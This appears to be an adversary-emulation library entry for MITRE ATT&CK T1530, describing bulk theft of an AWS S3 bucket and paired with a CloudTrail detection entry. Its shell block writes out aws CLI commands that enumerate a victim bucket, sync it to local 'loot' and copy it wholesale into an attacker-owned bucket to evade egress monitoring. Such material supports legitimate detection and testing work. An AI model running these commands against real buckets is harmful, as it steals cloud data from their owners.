---
id: aws-s3-mass-exfil
title: AWS S3 bulk object exfil (mass GetObject / CopyObject)
section: AWS / cloud collection
phase: Collection
attack:
  tactic: TA0009
  techniques: [T1530]
platform: [cloud]
source: MITRE ATT&CK T1530; S3 object-store data theft
pair: aws-s3-exfil-cloudtrail
---

S3 is the canonical cloud-exfil target: with a compromised principal, enumerate a
bucket and pull it wholesale. `ListBucket` maps the objects, then a bulk `GetObject`
(`aws s3 sync`) drags them out — or, to keep the bytes inside AWS and dodge egress
telemetry, `CopyObject` server-side straight into an attacker-owned bucket. The
volume is the point: hundreds to thousands of object reads from one identity in a
short window, often the first time that principal has ever touched the bucket.
(Cloud — no on-host target, so no slots.)

```sh
# map, then drag the whole bucket out to local loot
aws s3 ls s3://<victim-bucket> --recursive
aws s3 sync s3://<victim-bucket> ./loot
# …or server-side CopyObject into an attacker bucket — bytes never leave AWS
aws s3 cp s3://<victim-bucket> s3://<attacker-bucket> --recursive
```
